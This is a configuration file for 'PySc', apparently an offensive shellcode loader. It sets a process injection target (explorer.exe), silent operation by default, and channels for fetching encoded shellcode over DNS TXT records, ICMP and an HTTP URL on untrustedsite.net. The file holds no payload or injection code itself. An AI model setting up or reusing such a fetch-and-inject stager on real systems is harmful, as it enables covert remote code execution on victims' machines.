#
# PySc Configuration File
#

"""
	This configuration file includes settings that will be used by PySc when
	run without any command-line arguements. By default the PySc program will
	run using these settings and provide no feedback to the end-user.

	To view output, enable debug either within the Application behaviour section
	or via the command-line through the --debug switch.

	Any settings configured here can be overruled by the command-line switches
	See --help for a full list of command-line switches
"""

###############################
#### Configuration Section ####
###############################

#########################
# Application behaviour #
#########################

debug = False  # enable / disable feedback
header = False  # enable / disable header logo

###################################
# Process injection Configuration #
###################################

process = 'explorer.exe'  # target for injection, exe name or SELF
pid = ''  # specific PID number to target
fallback = True  # fallback to injection into the current process (Python)

#########################
# Special Configuration #
#########################

shellcode = ''  # put hard-coded shellcode here if desired (\xXX notation)

##########################
# Protocol Configuration #
##########################

# enable / disable checks for specified protocols
check = {
    "dns" : True,
	"url" : True,
	"icmp" : True
	}

# specify priority for each protocol ( dns | url | icmp )
priority = {
    "dns" : 1,
	"url" : 2,
	"icmp" : 3
	}

#####################
# DNS Configuration #
#####################

# dns sub-domains for TXT record retrieval. Must be in correct order!
dns = [
    '1.untrustedsite.net',
    '2.untrustedsite.net',
    #'3.untrustedsite.net',
    #'4.untrustedsite.net',
    ]

# enable / disable DNS protocol support ( tcp | udp )
dnsproto = {
    "tcp" : True,
	"udp": True
	} 

######################
# ICMP Configuration #
######################

icmp_target = '192.168.0.165'  # IP address to send icmp echo request and read responses from
icmp_sc_marker = 'SC'  # marker used to signify what follows is shellcode for decoding
icmp_trigger = 'Shellcode Please'  # trigger text sent in icmp echo request

# URL Configuration
url_target = 'http://www.untrustedsite.net/POC/shellcode.txt'  # url target to download encoded shellcode
url_sc_marker = 'SC' # marker used to signify what follows is shellcode for decoding

#EOF